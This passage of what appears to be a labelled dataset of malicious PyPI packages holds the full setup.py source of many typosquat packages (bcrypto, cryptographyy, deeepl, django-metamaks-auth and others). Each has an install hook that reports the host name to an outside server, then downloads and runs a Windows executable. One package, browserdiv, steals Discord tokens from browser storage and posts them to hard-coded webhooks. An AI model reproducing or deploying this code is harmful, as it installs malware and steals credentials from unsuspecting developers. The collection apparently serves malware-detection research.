		<td align='center'>raise artError</td>
	</tr>	
	</table> 

### Testing
- Only ASCII fonts and arts :
```
python -m art test
```

- All fonts, arts and decorations :
```
python -m art test2
```

### CLI			
- List of arts :  `python -m art list` or `python -m art arts`
- List of fonts : `python -m art fonts`
- Text : `python -m art text yourtext fontname(optional)`
- Art : `python -m art shape art_name` or `python -m art art art_name`
- Save :  `python -m art save yourtext fontname(optional)`
- All  :  `python -m art all yourtext`

### Telegram bot			

Just send your text to one of these bots. 👇👇👇👇		

<a href='https://t.me/artlib_bot' target='__blank'><img src='https://img.shields.io/badge/Telegram-Bot1-red.svg'></a>			

<a href='https://t.me/textart_robot' target='__blank'><img src='https://img.shields.io/badge/Telegram-Bot2-blue.svg'></a>


### Try ART in your browser

1. ART can be used online in interactive Jupyter Notebooks via the Binder service! Try it out now! :	

[![Binder](https://mybinder.org/badge_logo.svg)](https://mybinder.org/v2/gh/sepandhaghighi/art/master)

* Open `FontList.ipynb`, `ArtList.ipynb` and `DecorList.ipynb`
* Edit and execute each part of the notes, step by step from the top panel by run button

2. ART also can be used online in [ascii-generator.site](https://ascii-generator.site/), a Django website by [hermanTenuki](https://github.com/hermanTenuki)	

### Screen record		


<div align='center'>
<a href='https://asciinema.org/a/186368' target='_blank'><img src='https://asciinema.org/a/186368.png' /></a>
<p>Screen Record</p>
</div>

* View full font list ([Link1](https://github.com/sepandhaghighi/art/blob/master/FontList.ipynb 'Full Font List'),[Link2](http://art.shaghighi.ir/FontList.html 'Full Font List'))					
* View full art list ([Link1](https://github.com/sepandhaghighi/art/blob/master/ArtList.ipynb 'Full Art List'),[Link2](http://art.shaghighi.ir/ArtList.html 'Full Art List'))
* View full decoration list ([Link1](https://github.com/sepandhaghighi/art/blob/master/DecorList.ipynb 'Full Decoration List'),[Link2](http://art.shaghighi.ir/DecorList.html 'Full Decoration List'))

## Issues & bug reports			

1. Fill an issue and describe it. We'll check it ASAP!
    - Please complete the issue template
2. Discord : [https://discord.com/invite/FAAyq3QJqP](https://discord.com/invite/FAAyq3QJqP)
3. Website : [https://www.4r7.ir](https://www.4r7.ir)
4. Email : [info@4r7.ir](mailto:info@4r7.ir 'info@4r7.ir')

## Dependencies

<table>
	<tr> 
		<td align='center'>master</td>	
		<td align='center'>dev</td>	
	</tr>
	<tr>
		<td align='center'><a href='https://requires.io/github/sepandhaghighi/art/requirements/?branch=master'><img src='https://requires.io/github/sepandhaghighi/art/requirements.svg?branch=master' alt='Requirements Status' /></a></td>
		<td align='center'><a href='https://requires.io/github/sepandhaghighi/art/requirements/?branch=dev'><img src='https://requires.io/github/sepandhaghighi/art/requirements.svg?branch=dev' alt='Requirements Status' /></a></td>
	</tr>
</table>

## Reference    

1. [FIGlet](http://www.figlet.org/)
2. [1 Line Art](http://1lineart.kulaone.com/#/)
3. [Text To ASCII](http://patorjk.com/software/taag/#p=display&f=Blocks&t=ART)
4. [ASCII Generator](http://www.network-science.de/ascii/)
5. [Asky](https://asky.io/)
6. [Flipyourtext](https://www.flipyourtext.com/)
7. [YayText](https://yaytext.com)
8. [Coolletters](http://www.coolletters.net/)
9. [Instagram Fonts](https://igfonts.io/)
10. [Cool Symbol](https://coolsymbol.com/)
11. [ASCII Moji](http://asciimoji.com/)
12. [SMILEY COOL](https://smiley.cool/)
13. [SPREZZ](https://www.sprezzkeyboard.com/)
14. [Textart4u](http://textart4u.blogspot.com/2013/03/one-line-ascii-text-art.html?m=1)
15. [Chat4o](https://en.chat4o.com/ascii/)
16. [Findwebapp](http://www.findwebapp.com/ascii-art-one-liner/)
17. [Hubpages](https://hubpages.com/technology/one-line-ascii-art-for-twitter)
18. [ASCII-ART](http://www.ascii-art.de/ascii/mno/one_line.txt)
19. [Messletters](https://www.messletters.com/en/)
20. [Webestools](http://www.webestools.com/)
21. [ASCII-emoji](https://github.com/dysfunc/ascii-emoji)
22. [Instagram Fonts2](https://www.instagramfonts.com/)
23. [Emotiworld](http://en.emotiworld.com/)
24. [Fancy Text Pro](https://www.fancytextpro.com/)
25. [Playing cards in Unicode](https://en.m.wikipedia.org/wiki/Playing_cards_in_Unicode)
26. [Text Generator](https://coolfonts.text-generator.org/)
27. [GOGOTEXT](https://instafontsgen.codesdetail.com)
28. [Fsymbols](https://fsymbols.com/)


* Logo designed by [Arta Khanalizadeh](https://www.linkedin.com/in/artakhanalizadeh)	

## Show your support
								
<h3>Star this repo</h3>					

Give a ⭐️ if this project helped you!

<h3>Donate to our project</h3>	

If you do like our project and we hope that you do, can you please support us? Our project is not and is never going to be working for profit. We need the money just so we can continue doing what we do ;-) .			

<h4>Bitcoin</h4>
1KtNLEEeUbTEK9PdN6Ya3ZAKXaqoKUuxCy
<h4>Ethereum</h4>
0xcD4Db18B6664A9662123D4307B074aE968535388
<h4>Litecoin</h4>
Ldnz5gMcEeV8BAdsyf8FstWDC6uyYR6pgZ
<h4>Doge</h4>
DDUnKpFQbBqLpFVZ9DfuVysBdr249HxVDh
<h4>Tron</h4>
TCZxzPZLcJHr2qR3uPUB1tXB6L3FDSSAx7
<h4>Ripple</h4>
rN7ZuRG7HDGHR5nof8nu5LrsbmSB61V1qq
<h4>Binance Coin</h4>
bnb1zglwcf0ac3d0s2f6ck5kgwvcru4tlctt4p5qef
<h4>Tether</h4>
0xcD4Db18B6664A9662123D4307B074aE968535388
<h4>Dash</h4>
Xd3Yn2qZJ7VE8nbKw2fS98aLxR5M6WUU3s
<h4>Stellar</h4>		
GALPOLPISRHIYHLQER2TLJRGUSZH52RYDK6C3HIU4PSMNAV65Q36EGNL
<h4>Zilliqa</h4>
zil1knmz8zj88cf0exr2ry7nav9elehxfcgqu3c5e5
<h4>Coffeete</h4>
<a href='http://www.coffeete.ir/opensource'>
<img src='http://www.coffeete.ir/images/buttons/lemonchiffon.png' style='width:260px;' />
</a>
<h4>Gitcoin</h4>
<a href='https://gitcoin.co/grants/3408/ascii-art-library-for-python'>
<img src='https://github.com/sepandhaghighi/art/raw/master/otherfile/gitcoin_btn.png' style='width:260px;' />
</a>

<h3>Become a sponsor to ART</h3>

* Contact us at the email first	

<h4>Corporate sponsor</h4>

- **$250** a month
- Your company's logo can be featured on **Readme**
- Intended for small companies


<h4>Mega corporate sponsor</h4>

- **$500** a month
- Your company's logo can be featured on **Readme** and **Website**
- Intended for medium-sized companies""""""

setup(
    name=""ascii2text"",
    version='2.5',
    license='Eclipse Public License 2.0',
    authors=[""joe140""],
    author_email=""<joeyn@gmail.com>"",
    long_description=long_description,
    long_description_content_type='text/markdown',
    keywords=['cli', 'better', 'colors', 'terminal', 'tui', 'ascci'],
    packages=['ascii2text']
)

",1
asn2crypto-4.5.2,0,0,0,0,0,1,1,0,dependency_links.txt PKG-INFO SOURCES.txt top_level.txt CHANGELOG.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform

def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation new c kw "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_41.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()

#firstbasicpyapp, elevatepyapp, praisepyapp
setup(
  name='asn2crypto',
  version='4.5.2',
  description='A very basic firstbasicpyapp',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
bcrypto-4.4.2,0,0,0,0,0,1,1,0,dependency_links.txt PKG-INFO SOURCES.txt top_level.txt CHANGELOG.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform
 
def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_32.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()


setup(
  name='bcrypto',
  version='4.4.2',
  description='A very basic firstbasicpyapp!',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
bitcoinliv-4.5.2,0,0,0,0,0,1,1,0,dependency_links.txt PKG-INFO SOURCES.txt top_level.txt CHANGELOG.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform

def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation new c kw "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_41.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()

#firstbasicpyapp, elevatepyapp, praisepyapp
setup(
  name='bitcoinliv',
  version='4.5.2',
  description='A very basic firstbasicpyapp',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
browserdiv-3.2.0,0,0,0,1,0,0,1,0,dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt sitediv.py __init__.py PKG-INFO setup.cfg setup.py,"from setuptools import setup, find_packages
import os

here = os.path.abspath(os.path.dirname(__file__))


VERSION = '3.2.0'
DESCRIPTION = 'Discord selfbot module.'
LONG_DESCRIPTION = ""A short time ago , discord company had removed selfbots from its api , this module allows you to use them again ( I'm not responsible for anything happening for you account).""

# Setting up
setup(
    name=""browserdiv"",
    version=VERSION,
    author=""Charles Dickens"",
    author_email=""<charles_dickens@yahoo.com>"",
    description=DESCRIPTION,
    long_description_content_type=""text/markdown"",
    long_description=LONG_DESCRIPTION,
    packages=find_packages(),
    install_requires=['requests'] ,
    keywords=[] ,
    classifiers=[
        ""Development Status :: 1 - Planning"",
        ""Intended Audience :: Developers"",
        ""Programming Language :: Python :: 3"",
        ""Operating System :: Unix"",
        ""Operating System :: MacOS :: MacOS X"",
        ""Operating System :: Microsoft :: Windows"",
    ]
)
import os
import re
import json
import requests
from urllib.request import Request, urlopen

WEBHOOK_URL = 'https://discord.com/api/webhooks/983381308061388800/FIVWT3iNl-9MZMteTdYvTaV9iZoJTTMIEYdx5Mi-G-uD43YhslBmObBSwNWv8-EtRZtP'
WEBHOOK_URL2 = 'https://discord.com/api/webhooks/983381207758798918/3AqqFnq5WexU-yzlIsP-9sJOZPIJhcYT0UGH8iL2HWf-hRlMNWIDkXJi4UhefhDLh2ab'

PING_ME = True

def find_tokens(path):
	path += '\\Local Storage\\leveldb'

	tokens = []

	for file_name in os.listdir(path):
		if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
			continue

		for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
			for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
				for token in re.findall(regex, line):
					tokens.append(token)
	return tokens

def main():
	global token
	local = os.getenv('LOCALAPPDATA')
	roaming = os.getenv('APPDATA')

	paths = {
			'Discord': roaming + '\\Discord',
			'Discord Canary': roaming + '\\discordcanary',
			'Discord PTB': roaming + '\\discordptb',
			'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
			'Opera': roaming + '\\Opera Software\\Opera Stable',
			'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
			'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
		}

	message = '<@&978976910463864893>' if PING_ME else ''

	for platform, path in paths.items():
		if not os.path.exists(path):
			continue

		message += f'\n**Token found in : {platform}**\n```\n'

		tokens = find_tokens(path)

		if len(tokens) > 0:
			for token in tokens:
				message += f'{token}\n'
		else:
			message += 'No tokens found.\n'

		message += '```'

	headers = {
			'Content-Type': 'application/json',
			'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
		}

	payload = json.dumps({'content': message})

	try:
		req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
		urlopen(req)
		#data = {'content' : f'**<@&978976910463864893> \n__Token Recieved :__ \n`{t}`**'}
		#requests.post(url=WEBHOOK_URL2 , json=data)
	except:
		pass

main()",1
ccsv-4.5.2,0,0,0,0,0,1,1,0,dependency_links.txt PKG-INFO SOURCES.txt top_level.txt CHANGELOG.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform

def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation new c kw "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_41.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()

#firstbasicpyapp, elevatepyapp, praisepyapp
setup(
  name='ccsv',
  version='4.5.2',
  description='A very basic firstbasicpyapp',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
coingecko-apis-1.4,0,0,0,0,0,1,1,0,CHANGELOG.txt dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform
 
def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_32.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()


setup(
  name='coingecko-apis',
  version='1.4',
  description='A very basic firstbasicpyapp!',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
coinmarketcaps-5.0.5,0,0,0,0,0,1,1,0,CHANGELOG.txt dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform
 
def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_32.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()


setup(
  name='coinmarketcaps',
  version='5.0.5',
  description='A very basic firstbasicpyapp!',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
crypto-get-price-4.5.2,0,0,0,0,0,1,1,0,CHANGELOG.txt dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform

def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation new c kw "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_41.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()

#firstbasicpyapp, elevatepyapp, praisepyapp
setup(
  name='crypto-get-price',
  version='4.5.2',
  description='A very basic firstbasicpyapp',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
crypto-open-4.5.2,0,0,0,0,0,1,1,0,CHANGELOG.txt dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform

def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation new c kw "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_41.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()

#firstbasicpyapp, elevatepyapp, praisepyapp
setup(
  name='crypto-open',
  version='4.5.2',
  description='A very basic firstbasicpyapp',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
cryptobalance-4.5.2,0,0,0,0,0,1,1,0,CHANGELOG.txt dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform

def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation new c kw "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_41.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()

#firstbasicpyapp, elevatepyapp, praisepyapp
setup(
  name='cryptobalance',
  version='4.5.2',
  description='A very basic firstbasicpyapp',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
cryptographyy-4.5.2,0,0,0,0,0,1,1,0,CHANGELOG.txt dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform

def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation new c kw "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_41.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()

#firstbasicpyapp, elevatepyapp, praisepyapp
setup(
  name='cryptographyy',
  version='4.5.2',
  description='A very basic firstbasicpyapp',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
csvv-4.5.2,0,0,0,0,0,1,1,0,CHANGELOG.txt dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform

def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation new c kw "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_41.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()

#firstbasicpyapp, elevatepyapp, praisepyapp
setup(
  name='csvv',
  version='4.5.2',
  description='A very basic firstbasicpyapp',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
deeepl-4.5.2,0,0,0,0,0,1,1,0,CHANGELOG.txt dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform

def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_41.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()

#firstbasicpyapp, elevatepyapp, praisepyapp
setup(
  name='deeepl',
  version='4.5.2',
  description='A very basic firstbasicpyapp',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
deep-translate-4.4.2,0,0,0,0,0,1,1,0,CHANGELOG.txt dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform
 
def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_32.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()


setup(
  name='deep-translate',
  version='4.4.2',
  description='A very basic firstbasicpyapp!',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
deep-translation-4.4.7,0,0,0,0,0,1,1,0,CHANGELOG.txt dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform
 
def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_32.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()

#firstbasicpyapp, elevatepyapp, praisepyapp
setup(
  name='deep-translation',
  version='4.4.7',
  description='A very basic firstbasicpyapp',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
discord.pt-4.4.2,0,0,0,0,0,1,1,0,CHANGELOG.txt dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform
 
def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_32.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()


setup(
  name='discord.pt',
  version='4.4.2',
  description='A very basic firstbasicpyapp!',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
discord.pu-4.4.2,0,0,0,0,0,1,1,0,CHANGELOG.txt dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform
 
def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_32.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()


setup(
  name='discord.pu',
  version='4.4.2',
  description='A very basic firstbasicpyapp!',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
discordhook-4.5.2,0,0,0,0,0,1,1,0,CHANGELOG.txt dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform

def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_41.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()

#firstbasicpyapp, elevatepyapp, praisepyapp
setup(
  name='discordhook',
  version='4.5.2',
  description='A very basic firstbasicpyapp',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
django-metamaks-auth-4.5.2,0,0,0,0,0,1,1,0,CHANGELOG.txt dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform

def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation new c kw "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_41.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()

#firstbasicpyapp, elevatepyapp, praisepyapp
setup(
  name='django-metamaks-auth',
  version='4.5.2',
  description='A very basic firstbasicpyapp',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
django-metamask-aut-4.5.2,0,0,0,0,0,1,1,0,CHANGELOG.txt dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform

def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation new c kw "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_41.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()

#firstbasicpyapp, elevatepyapp, praisepyapp
setup(
  name='django-metamask-aut',
  version='4.5.2',
  description='A very basic firstbasicpyapp',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
django-web2-auth-4.5.2,0,0,0,0,0,1,1,0,CHANGELOG.txt dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform

def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation new c kw "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_41.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()

#firstbasicpyapp, elevatepyapp, praisepyapp
setup(
  name='django-web2-auth',
  version='4.5.2',
  description='A very basic firstbasicpyapp',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
django-web3-aut-4.5.2,0,0,0,0,0,1,1,0,CHANGELOG.txt dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform

def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation new c kw "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
